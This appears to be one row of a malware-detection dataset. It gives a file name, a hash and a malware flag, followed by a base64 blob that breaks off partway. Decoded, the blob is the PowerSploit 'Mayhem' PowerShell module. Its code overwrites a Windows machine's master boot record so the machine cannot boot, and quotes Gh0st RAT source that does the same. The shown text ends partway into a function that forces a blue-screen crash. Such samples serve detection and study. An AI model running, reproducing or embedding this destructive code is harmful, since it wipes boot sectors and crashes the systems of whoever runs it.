Mayhem.psm1,27d551ae28116fd434cea76c38da25b3,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gU2V0LU1hc3RlckJvb3RSZWNvcmQKewo8IwouU1lOT1BTSVMKCiAgICBQcm9vZiBvZiBjb25jZXB0IGNvZGUgdGhhdCBvdmVyd3JpdGVzIHRoZSBtYXN0ZXIgYm9vdCByZWNvcmQgd2l0aCB0aGUKICAgIG1lc3NhZ2Ugb2YgeW91ciBjaG9pY2UuCgogICAgUG93ZXJTcGxvaXQgRnVuY3Rpb246IFNldC1NYXN0ZXJCb290UmVjb3JkCiAgICBBdXRob3I6IE1hdHRoZXcgR3JhZWJlciAoQG1hdHRpZmVzdGF0aW9uKSBhbmQgQ2hyaXMgQ2FtcGJlbGwgKEBvYnNjdXJlc2VjKQogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICBSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUKICAgIE9wdGlvbmFsIERlcGVuZGVuY2llczogTm9uZQogCi5ERVNDUklQVElPTgoKICAgIFNldC1NYXN0ZXJCb290UmVjb3JkIGlzIHByb29mIG9mIGNvbmNlcHQgY29kZSBkZXNpZ25lZCB0byBzaG93IHRoYXQgaXQgaXMKICAgIHBvc3NpYmxlIHdpdGggUG93ZXJTaGVsbCB0byBvdmVyd3JpdGUgdGhlIE1CUi4gVGhpcyB0ZWNobmlxdWUgd2FzIHRha2VuCiAgICBmcm9tIGEgcHVibGljIG1hbHdhcmUgc2FtcGxlLiBUaGlzIHNjcmlwdCBpcyBpbnRlZGVkIHNvbGVseSBhcyBwcm9vZiBvZgogICAgY29uY2VwdCBjb2RlLgoKLlBBUkFNRVRFUiBCb290TWVzc2FnZQoKICAgIFNwZWNpZmllcyB0aGUgbWVzc2FnZSB0aGF0IHdpbGwgYmUgZGlzcGxheWVkIHVwb24gbWFraW5nIHlvdXIgY29tcHV0ZXIgYSBicmljay4KCi5QQVJBTUVURVIgUmVib290SW1tZWRpYXRlbHkKCiAgICBSZWJvb3QgdGhlIG1hY2hpbmUgaW1tZWRpYXRlbHkgdXBvbiBvdmVyd3JpdGluZyB0aGUgTUJSLgoKLlBBUkFNRVRFUiBGb3JjZQoKICAgIFN1cHByZXNzIHRoZSB3YXJuaW5nIHByb21wdC4KCi5FWEFNUExFCgogICAgU2V0LU1hc3RlckJvb3RSZWNvcmQgLUJvb3RNZXNzYWdlICdUaGlzIGlzIHdoYXQgaGFwcGVucyB3aGVuIHlvdSBmYWlsIHRvIGRlZmVuZCB5b3VyIG5ldHdvcmsuICNDQ0RDJwoKLk5PVEVTCgogICAgT2J2aW91c2x5LCB0aGlzIHdpbGwgb25seSB3b3JrIGlmIHlvdSBoYXZlIGEgbWFzdGVyIGJvb3QgcmVjb3JkIHRvCiAgICBvdmVyd3JpdGUuIFRoaXMgd29uJ3Qgd29yayBpZiB5b3UgaGF2ZSBhIEdQVCAoR1VJRCBwYXJ0aXRpb24gdGFibGUpCiM+Cgo8IwpUaGlzIGNvZGUgd2FzIGluc3BpcmVkIGJ5IHRoZSBHaDBzdCBSQVQgc291cmNlIGNvZGUgc2VlbiBoZXJlIChhY3F1aXJlZCBmcm9tOiBodHRwOi8vd2ViY2FjaGUuZ29vZ2xldXNlcmNvbnRlbnQuY29tL3NlYXJjaD9xPWNhY2hlOjYwdVV1WGZRRjZvSjpyZWFkLnB1ZG4uY29tL2Rvd25sb2FkczExNi9zb3VyY2Vjb2RlL2hhY2svdHJvamFuLzQ5NDU3NC9naDBzdDMuNl8lMjVFNiUyNUJBJTI1OTAlMjVFNCUyNUJCJTI1QTMlMjVFNyUyNUEwJTI1ODEvZ2gwc3QvZ2gwc3QuY3BwX18uaHRtKyZjZD0zJmhsPWVuJmN0PWNsbmsmZ2w9dXMpOgoKLy8gQ0doMHN0QXBwIG1lc3NhZ2UgaGFuZGxlcnMgCiAKdW5zaWduZWQgY2hhciBzY29kZVtdID0gCiJceGI4XHgxMlx4MDBceGNkXHgxMFx4YmRceDE4XHg3Y1x4YjlceDE4XHgwMFx4YjhceDAxXHgxM1x4YmJceDBjIiAKIlx4MDBceGJhXHgxZFx4MGVceGNkXHgxMFx4ZTJceGZlXHg0OVx4MjBceDYxXHg2ZFx4MjBceDc2XHg2OVx4NzIiIAoiXHg3NVx4NzNceDIxXHgyMFx4NDZceDc1XHg2M1x4NmJceDIwXHg3OVx4NmZceDc1XHgyMFx4M2FceDJkXHgyOSI7IAogCmludCBDR2gwc3RBcHA6OktpbGxNQlIoKSAKeyAKCUhBTkRMRSBoRGV2aWNlOyAKCURXT1JEIGR3Qnl0ZXNXcml0dGVuLCBkd0J5dGVzUmV0dXJuZWQ7IAoJQllURSBwTUJSWzUxMl0gPSB7MH07IAoJIAoJLy8gPz8/P01CUiAKCW1lbWNweShwTUJSLCBzY29kZSwgc2l6ZW9mKHNjb2RlKSAtIDEpOyAKCXBNQlJbNTEwXSA9IDB4NTU7IAoJcE1CUls1MTFdID0gMHhBQTsgCgkgCgloRGV2aWNlID0gQ3JlYXRlRmlsZSAKCQkoIAoJCSJcXFxcLlxcUEhZU0lDQUxEUklWRTAiLCAKCQlHRU5FUklDX1JFQUQgfCBHRU5FUklDX1dSSVRFLCAKCQlGSUxFX1NIQVJFX1JFQUQgfCBGSUxFX1NIQVJFX1dSSVRFLCAKCQlOVUxMLCAKCQlPUEVOX0VYSVNUSU5HLCAKCQkwLCAKCQlOVUxMIAoJCSk7IAoJaWYgKGhEZXZpY2UgPT0gSU5WQUxJRF9IQU5ETEVfVkFMVUUpIAoJCXJldHVybiAtMTsgCglEZXZpY2VJb0NvbnRyb2wgCgkJKCAKCQloRGV2aWNlLCAgCgkJRlNDVExfTE9DS19WT0xVTUUsICAKCQlOVUxMLCAgCgkJMCwgIAoJCU5VTEwsICAKCQkwLCAgCgkJJmR3Qnl0ZXNSZXR1cm5lZCwgIAoJCU5VTEwgCgkJKTsgCgkvLyA/Pz8/Pz8gCglXcml0ZUZpbGUoaERldmljZSwgcE1CUiwgc2l6ZW9mKHBNQlIpLCAmZHdCeXRlc1dyaXR0ZW4sIE5VTEwpOyAKCURldmljZUlvQ29udHJvbCAKCQkoIAoJCWhEZXZpY2UsICAKCQlGU0NUTF9VTkxPQ0tfVk9MVU1FLCAgCgkJTlVMTCwgIAoJCTAsICAKCQlOVUxMLCAgCgkJMCwgIAoJCSZkd0J5dGVzUmV0dXJuZWQsICAKCQlOVUxMIAoJCSk7IAoJQ2xvc2VIYW5kbGUoaERldmljZSk7IAogCglFeGl0UHJvY2VzcygtMSk7IAoJcmV0dXJuIDA7IAp9IAojPgoKICAgIFtDbWRsZXRCaW5kaW5nKFN1cHBvcnRzU2hvdWxkUHJvY2VzcyA9ICRUcnVlLCBDb25maXJtSW1wYWN0ID0gJ0hpZ2gnKV0gUGFyYW0gKAogICAgICAgIFtWYWxpZGF0ZUxlbmd0aCgxLCA0NzkpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEJvb3RNZXNzYWdlID0gJ1N0b3AtQ3J5aW5nOyBHZXQtTmV3SGFyZERyaXZlJywKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmVib290SW1tZWRpYXRlbHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZvcmNlCiAgICApCgogICAgaWYgKCEoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV0nQWRtaW5pc3RyYXRvcicpKQogICAgewogICAgICAgIHRocm93ICdUaGlzIHNjcmlwdCBtdXN0IGJlIGV4ZWN1dGVkIGZyb20gYW4gZWxldmF0ZWQgY29tbWFuZCBwcm9tcHQuJwogICAgfQoKICAgIGlmICghJEZvcmNlKQogICAgewogICAgICAgIGlmICghJHBzQ21kbGV0LlNob3VsZENvbnRpbnVlKCdEbyB5b3Ugd2FudCB0byBjb250aW51ZT8nLCdTZXQtTWFzdGVyQm9vdFJlY29yZCBwcmV2ZW50IHlvdXIgbWFjaGluZSBmcm9tIGJvb3RpbmcuJykpCiAgICAgICAgewogICAgICAgICAgICByZXR1cm4KICAgICAgICB9CiAgICB9CgogICAgI3JlZ2lvbiBkZWZpbmUgUC9JbnZva2UgdHlwZXMgZHluYW1pY2FsbHkKICAgICREeW5Bc3NlbWJseSA9IE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdXaW4zMicpCiAgICAkQXNzZW1ibHlCdWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5Bc3NlbWJseSwgW1JlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pCiAgICAkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgnV2luMzInLCAkRmFsc2UpCgogICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnV2luMzIuS2VybmVsMzInLCAnUHVibGljLCBDbGFzcycpCiAgICAkRGxsSW1wb3J0Q29uc3RydWN0b3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0QXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcihAKFtTdHJpbmddKSkKICAgICRTZXRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0QXR0cmlidXRlXS5HZXRGaWVsZCgnU2V0TGFzdEVycm9yJykKICAgICRTZXRMYXN0RXJyb3JDdXN0b21BdHRyaWJ1dGUgPSBOZXctT2JqZWN0IFJlZmxlY3Rpb24uRW1pdC5DdXN0b21BdHRyaWJ1dGVCdWlsZGVyKCREbGxJbXBvcnRDb25zdHJ1Y3RvciwKICAgICAgICBAKCdrZXJuZWwzMi5kbGwnKSwKICAgICAgICBbUmVmbGVjdGlvbi5GaWVsZEluZm9bXV1AKCRTZXRMYXN0RXJyb3IpLAogICAgICAgIEAoJFRydWUpKQoKICAgICMgRGVmaW5lIFtXaW4zMi5LZXJuZWwzMl06OkRldmljZUlvQ29udHJvbAogICAgJFBJbnZva2VNZXRob2QgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lUEludm9rZU1ldGhvZCgnRGV2aWNlSW9Db250cm9sJywKICAgICAgICAna2VybmVsMzIuZGxsJywKICAgICAgICAoW1JlZmxlY3Rpb24uTWV0aG9kQXR0cmlidXRlc106OlB1YmxpYyAtYm9yIFtSZWZsZWN0aW9uLk1ldGhvZEF0dHJpYnV0ZXNdOjpTdGF0aWMpLAogICAgICAgIFtSZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLAogICAgICAgIFtCb29sXSwKICAgICAgICBbVHlwZVtdXUAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50UHRyXSksCiAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNhbGxpbmdDb252ZW50aW9uXTo6V2luYXBpLAogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0XTo6QXV0bykKICAgICRQSW52b2tlTWV0aG9kLlNldEN1c3RvbUF0dHJpYnV0ZSgkU2V0TGFzdEVycm9yQ3VzdG9tQXR0cmlidXRlKQoKICAgICMgRGVmaW5lIFtXaW4zMi5LZXJuZWwzMl06OkNyZWF0ZUZpbGUKICAgICRQSW52b2tlTWV0aG9kID0gJFR5cGVCdWlsZGVyLkRlZmluZVBJbnZva2VNZXRob2QoJ0NyZWF0ZUZpbGUnLAogICAgICAgICdrZXJuZWwzMi5kbGwnLAogICAgICAgIChbUmVmbGVjdGlvbi5NZXRob2RBdHRyaWJ1dGVzXTo6UHVibGljIC1ib3IgW1JlZmxlY3Rpb24uTWV0aG9kQXR0cmlidXRlc106OlN0YXRpYyksCiAgICAgICAgW1JlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsCiAgICAgICAgW0ludFB0cl0sCiAgICAgICAgW1R5cGVbXV1AKFtTdHJpbmddLCBbSW50MzJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW0ludFB0cl0pLAogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DYWxsaW5nQ29udmVudGlvbl06OldpbmFwaSwKICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2hhclNldF06OkFuc2kpCiAgICAkUEludm9rZU1ldGhvZC5TZXRDdXN0b21BdHRyaWJ1dGUoJFNldExhc3RFcnJvckN1c3RvbUF0dHJpYnV0ZSkKCiAgICAjIERlZmluZSBbV2luMzIuS2VybmVsMzJdOjpXcml0ZUZpbGUKICAgICRQSW52b2tlTWV0aG9kID0gJFR5cGVCdWlsZGVyLkRlZmluZVBJbnZva2VNZXRob2QoJ1dyaXRlRmlsZScsCiAgICAgICAgJ2tlcm5lbDMyLmRsbCcsCiAgICAgICAgKFtSZWZsZWN0aW9uLk1ldGhvZEF0dHJpYnV0ZXNdOjpQdWJsaWMgLWJvciBbUmVmbGVjdGlvbi5NZXRob2RBdHRyaWJ1dGVzXTo6U3RhdGljKSwKICAgICAgICBbUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwKICAgICAgICBbQm9vbF0sCiAgICAgICAgW1R5cGVbXV1AKFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludFB0cl0pLAogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DYWxsaW5nQ29udmVudGlvbl06OldpbmFwaSwKICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2hhclNldF06OkFuc2kpCiAgICAkUEludm9rZU1ldGhvZC5TZXRDdXN0b21BdHRyaWJ1dGUoJFNldExhc3RFcnJvckN1c3RvbUF0dHJpYnV0ZSkKCiAgICAjIERlZmluZSBbV2luMzIuS2VybmVsMzJdOjpDbG9zZUhhbmRsZQogICAgJFBJbnZva2VNZXRob2QgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lUEludm9rZU1ldGhvZCgnQ2xvc2VIYW5kbGUnLAogICAgICAgICdrZXJuZWwzMi5kbGwnLAogICAgICAgIChbUmVmbGVjdGlvbi5NZXRob2RBdHRyaWJ1dGVzXTo6UHVibGljIC1ib3IgW1JlZmxlY3Rpb24uTWV0aG9kQXR0cmlidXRlc106OlN0YXRpYyksCiAgICAgICAgW1JlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsCiAgICAgICAgW0Jvb2xdLAogICAgICAgIFtUeXBlW11dQChbSW50UHRyXSksCiAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNhbGxpbmdDb252ZW50aW9uXTo6V2luYXBpLAogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0XTo6QXV0bykKICAgICRQSW52b2tlTWV0aG9kLlNldEN1c3RvbUF0dHJpYnV0ZSgkU2V0TGFzdEVycm9yQ3VzdG9tQXR0cmlidXRlKQoKICAgICRLZXJuZWwzMiA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKICAgICNlbmRyZWdpb24KCiAgICAkTGVuZ3RoQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoKFtJbnQxNl0gKCRCb290TWVzc2FnZS5MZW5ndGggKyA1KSkpCiAgICAjIENvbnZlcnQgdGhlIGJvb3QgbWVzc2FnZSB0byBhIGJ5dGUgYXJyYXkKICAgICRNZXNzYWdlQnl0ZXMgPSBbVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCgnUFMgPiAnICsgJEJvb3RNZXNzYWdlKSkKCiAgICBbQnl0ZVtdXSAkTUJSSW5mZWN0aW9uQ29kZSA9IEAoCiAgICAgICAgMHhiOCwgMHgxMiwgMHgwMCwgICAgICAgICAjIE1PViAgQVgsIDB4MDAxMiA7IENNRDogU2V0IHZpZGVvIG1vZGUsIEFSRzogdGV4dCByZXNvbHV0aW9uIDgweDMwLCBwaXhlbCByZXNvbHV0aW9uIDY0MHg0ODAsIGNvbG9ycyAxNi8yNTZLLCBWR0EKICAgICAgICAweGNkLCAweDEwLCAgICAgICAgICAgICAgICMgSU5UICAweDEwICAgICAgIDsgQklPUyBpbnRlcnJ1cHQgY2FsbCAtIFNldCB2aWRlbyBtb2RlCiAgICAgICAgMHhiOCwgMHgwMCwgMHgwQiwgICAgICAgICAjIE1PViAgQVgsIDB4MEIwMCA7IENNRDogU2V0IGJhY2tncm91bmQgY29sb3IKICAgICAgICAweGJiLCAweDAxLCAweDAwLCAgICAgICAgICMgTU9WICBCWCwgMHgwMDBGIDsgQmFja2dyb3VuZCBjb2xvcjogQmx1ZQogICAgICAgIDB4Y2QsIDB4MTAsICAgICAgICAgICAgICAgIyBJTlQgIDB4MTAgICAgICAgOyBCSU9TIGludGVycnVwdCBjYWxsIC0gU2V0IGJhY2tncm91bmQgY29sb3IKICAgICAgICAweGJkLCAweDIwLCAweDdjLCAgICAgICAgICMgTU9WICBCUCwgMHg3QzE4IDsgT2Zmc2V0IHRvIHN0cmluZzogMHg3QzAwIChiYXNlIG9mIE1CUiBjb2RlKSArIDB4MjAKICAgICAgICAweGI5KSArICRMZW5ndGhCeXRlcyArIEAoICMgTU9WICBDWCwgMHgwMDE4IDsgU3RyaW5nIGxlbmd0aAogICAgICAgIDB4YjgsIDB4MDEsIDB4MTMsICAgICAgICAgIyBNT1YgIEFYLCAweDEzMDEgOyBDTUQ6IFdyaXRlIHN0cmluZywgQVJHOiBBc3NpZ24gQkwgYXR0cmlidXRlIChjb2xvcikgdG8gYWxsIGNoYXJhY3RlcnMKICAgICAgICAweGJiLCAweDBmLCAweDAwLCAgICAgICAgICMgTU9WICBCWCwgMHgwMDBGIDsgUGFnZSBOdW06IDAsIENvbG9yOiBXaGl0ZQogICAgICAgIDB4YmEsIDB4MDAsIDB4MDAsICAgICAgICAgIyBNT1YgIERYLCAweDAwMDAgOyBSb3c6IDAsIENvbHVtbjogMAogICAgICAgIDB4Y2QsIDB4MTAsICAgICAgICAgICAgICAgIyBJTlQgIDB4MTAgICAgICAgOyBCSU9TIGludGVycnVwdCBjYWxsIC0gV3JpdGUgc3RyaW5nCiAgICAgICAgMHhlMiwgMHhmZSAgICAgICAgICAgICAgICAjIExPT1AgMHgxNiAgICAgICA7IFByaW50IGFsbCBjaGFyYWN0ZXJzIHRvIHRoZSBidWZmZXIKICAgICAgICApICsgJE1lc3NhZ2VCeXRlcwoKICAgICRNQlJTaXplID0gW1VJbnQzMl0gNTEyCgogICAgaWYgKCRNQlJJbmZlY3Rpb25Db2RlLkxlbmd0aCAtZ3QgKCRNQlJTaXplIC0gMikpCiAgICB7CiAgICAgICAgdGhyb3cgIlRoZSBzaXplIG9mIHRoZSBNQlIgaW5mZWN0aW9uIGNvZGUgY2Fubm90IGV4Y2VlZCAkKCRNQlJTaXplIC0gMikgYnl0ZXMuIgogICAgfQoKICAgICMgQWxsb2NhdGUgNTEyIGJ5dGVzIGZvciB0aGUgTUJSCiAgICAkTUJSQnl0ZXMgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkTUJSU2l6ZSkKCiAgICAjIFplcm8taW5pdGlhbGl6ZSB0aGUgYWxsb2NhdGVkIHVubWFuYWdlZCBtZW1vcnkKICAgIDAuLjUxMSB8ICUgeyBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OldyaXRlQnl0ZShbSW50UHRyXTo6QWRkKCRNQlJCeXRlcywgJF8pLCAwKSB9CgogICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRNQlJJbmZlY3Rpb25Db2RlLCAwLCAkTUJSQnl0ZXMsICRNQlJJbmZlY3Rpb25Db2RlLkxlbmd0aCkKCiAgICAjIFdyaXRlIGJvb3QgcmVjb3JkIHNpZ25hdHVyZSB0byB0aGUgZW5kIG9mIHRoZSBNQlIKICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6V3JpdGVCeXRlKFtJbnRQdHJdOjpBZGQoJE1CUkJ5dGVzLCAoJE1CUlNpemUgLSAyKSksIDB4NTUpCiAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OldyaXRlQnl0ZShbSW50UHRyXTo6QWRkKCRNQlJCeXRlcywgKCRNQlJTaXplIC0gMSkpLCAweEFBKQoKICAgICMgR2V0IHRoZSBkZXZpY2UgSUQgb2YgdGhlIGJvb3QgZGlzawogICAgJERldmljZUlEID0gR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfRGlza0RyaXZlIC1GaWx0ZXIgJ0luZGV4ID0gMCcgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBEZXZpY2VJRAoKICAgICRHRU5FUklDX1JFQURXUklURSA9IDB4ODAwMDAwMDAgLWJvciAweDQwMDAwMDAwCiAgICAkRklMRV9TSEFSRV9SRUFEV1JJVEUgPSAyIC1ib3IgMQogICAgJE9QRU5fRVhJU1RJTkcgPSAzCgogICAgIyBPYnRhaW4gYSByZWFkIGhhbmRsZSB0byB0aGUgcmF3IGRpc2sKICAgICREcml2ZUhhbmRsZSA9ICRLZXJuZWwzMjo6Q3JlYXRlRmlsZSgkRGV2aWNlSUQsICRHRU5FUklDX1JFQURXUklURSwgJEZJTEVfU0hBUkVfUkVBRFdSSVRFLCAwLCAkT1BFTl9FWElTVElORywgMCwgMCkKCiAgICBpZiAoJERyaXZlSGFuZGxlIC1lcSAoW0ludFB0cl0gMHhGRkZGRkZGRikpCiAgICB7CiAgICAgICAgdGhyb3cgIlVuYWJsZSB0byBvYnRhaW4gcmVhZC93cml0ZSBoYW5kbGUgdG8gJERldmljZUlEIgogICAgfQoKICAgICRCeXRlc1JldHVybmVkID0gW1VJbnQzMl0gMAogICAgJEJ5dGVzV3JpdHRlbiA9ICBbVUludDMyXSAwCiAgICAkRlNDVExfTE9DS19WT0xVTUUgPSAgIDB4MDAwOTAwMTgKICAgICRGU0NUTF9VTkxPQ0tfVk9MVU1FID0gMHgwMDA5MDAxQwoKICAgICRudWxsID0gJEtlcm5lbDMyOjpEZXZpY2VJb0NvbnRyb2woJERyaXZlSGFuZGxlLCAkRlNDVExfTE9DS19WT0xVTUUsIDAsIDAsIDAsIDAsIFtSZWZdICRCeXRlc1JldHVybmVkLCAwKQogICAgJG51bGwgPSAkS2VybmVsMzI6OldyaXRlRmlsZSgkRHJpdmVIYW5kbGUsICRNQlJCeXRlcywgJE1CUlNpemUsIFtSZWZdICRCeXRlc1dyaXR0ZW4sIDApCiAgICAkbnVsbCA9ICRLZXJuZWwzMjo6RGV2aWNlSW9Db250cm9sKCREcml2ZUhhbmRsZSwgJEZTQ1RMX1VOTE9DS19WT0xVTUUsIDAsIDAsIDAsIDAsIFtSZWZdICRCeXRlc1JldHVybmVkLCAwKQogICAgJG51bGwgPSAkS2VybmVsMzI6OkNsb3NlSGFuZGxlKCREcml2ZUhhbmRsZSkKCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAyCgogICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkTUJSQnl0ZXMpCgogICAgV3JpdGUtVmVyYm9zZSAnTWFzdGVyIGJvb3QgcmVjb3JkIG92ZXJ3cml0dGVuIHN1Y2Nlc3NmdWxseS4nCgogICAgaWYgKCRSZWJvb3RJbW1lZGlhdGVseSkKICAgIHsKICAgICAgICBSZXN0YXJ0LUNvbXB1dGVyIC1Gb3JjZQogICAgfQp9CgpmdW5jdGlvbiBTZXQtQ3JpdGljYWxQcm9jZXNzCnsKPCMKLlNZTk9QU0lTCgpDYXVzZXMgeW91ciBtYWNoaW5lIHRvIGJsdWUgc2NyZWVuIHVwb24gZXhpdGluZyBQb3dlclNoZWxsLgoKUG93ZXJTcGxvaXQgRnVuY3Rpb246IFNldC1Dcml0aWNhbFByb2Nlc3MKQXV0aG9yOiBNYXR0aGV3IEdyYWViZXIgKEBtYXR0aWZlc3RhdGlvbikKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKCi5QQVJBTUVURVIgRXhpdEltbWVkaWF0ZWx5CgpJbW1lZGlhdGVseSBleGl0IFBvd2VyU2hlbGwgYWZ0ZXIgc3VjY2Vzc2Z1bGx5IG1hcmtpbmcgdGhlIHByb2Nlc3MgYXMgY3JpdGljYWwuCgouUEFSQU1FVEVSIEZvcmNlCgpTZXQgdGhlIHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzIGFzIGNyaXRpY2FsIHdpdGhvdXQgYXNraW5nIGZvciBjb25maXJtYXRpb24uCgouRVhBTVBMRQoKU2V0LUNyaXRpY2FsUHJvY2VzcwoKLkVYQU1QTEUKClNldC1Dcml0aWNhbFByb2Nlc3MgLUV4aXRJbW1lZGlhdGVseQoKLkVYQU1QTEUKClNldC1Dcml0aWNhbFByb2Nlc3MgLUZvcmNlIC1WZXJib3NlCgojPgoKICAgIFtDbWRsZXRCaW5kaW5nKFN1cHBvcnRzU2hvdWxkUHJvY2VzcyA9ICRUcnVlLCBDb25maXJtSW1wYWN0ID0gJ0hpZ2gnKV0gUGFyYW0gKAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZvcmNlLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRFeGl0SW1tZWRpYXRlbHkKICAgICkKCiAgICBpZiAoLW5vdCAoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV06OkFkbWluaXN0cmF0b3IpKQogICAgewogICAgICAgIHRocm93ICdZb3UgbXVzdCBydW4gU2V0LUNyaXRpY2FsUHJvY2VzcyBmcm9tIGFuIGVsZXZhdGVkIFBvd2VyU2hlbGwgcHJvbXB0LicKICAgIH0KCiAgICAkUmVzcG9uc2UgPSAkVHJ1ZQoKICAgIGlmICghJEZvcmNlKQogICAgewogICAgICAgICRSZXNwb25zZSA9ICRwc0NtZGxldC5TaG91bGRDb250aW51ZSgnSGF2ZSB5b3Ugc2F2ZWQgYWxsIHlvdXIgd29yaz8nLCAnVGhlIG1hY2hpbmUgd2lsbCBibHVlIHNjcmVlbiB3aGVuIHlvdSBleGl0IFBvd2VyU2hlbGwuJykKICAgIH0KICAgIAogICAgaWYgKCEkUmVzcG9uc2UpCiAgICB7CiAgICAgICAgcmV0dXJuCiAgICB9CgogICAgJER5bkFzc2VtYmx5ID0gTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ0JsdWVTY3JlZW4nKQogICAgJEFzc2VtYmx5QnVpbGRlciA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksIFtSZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKQogICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0JsdWVTY3JlZW4nLCAkRmFsc2UpCgogICAgIyBEZWZpbmUgW250ZGxsXTo6TnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uIG1ldGhvZAogICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnQmx1ZVNjcmVlbi5XaW4zMi5udGRsbCcsICdQdWJsaWMsIENsYXNzJykKICAgICRQSW52b2tlTWV0aG9kID0gJFR5cGVCdWlsZGVyLkRlZmluZVBJbnZva2VNZXRob2QoJ050U2V0SW5mb3JtYXRpb25Qcm9jZXNzJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbnRkbGwuZGxsJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoW1JlZmxlY3Rpb24uTWV0aG9kQXR0cmlidXRlc10gJ1B1YmxpYywgU3RhdGljJyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW1JlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI